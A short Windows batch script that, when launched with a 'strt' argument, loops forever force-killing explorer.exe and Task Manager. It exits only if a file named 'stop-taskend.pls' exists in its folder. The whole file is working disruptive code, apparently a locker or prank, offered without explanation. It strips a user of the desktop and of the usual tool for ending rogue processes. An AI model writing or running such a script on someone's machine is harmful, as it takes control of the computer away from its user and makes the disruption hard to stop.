@echo off
echo %* | findstr /I "strt"
if "%errorlevel%" == "0" goto :start
echo Uhm... Just to warn ya, don't open me like this please
echo.
echo Press any key to exit...
pause > nul
exit

:start
cls
if exist "%~dp0stop-taskend.pls" exit
tasklist /nh /fi "imagename eq explorer.exe" | find /i "explorer.exe" >nul && (
taskkill -im explorer.exe /f > nul
)
tasklist /nh /fi "imagename eq taskmgr.exe" | find /i "taskmgr.exe" >nul && (
taskkill -im taskmgr.exe /f > nul
)
goto :start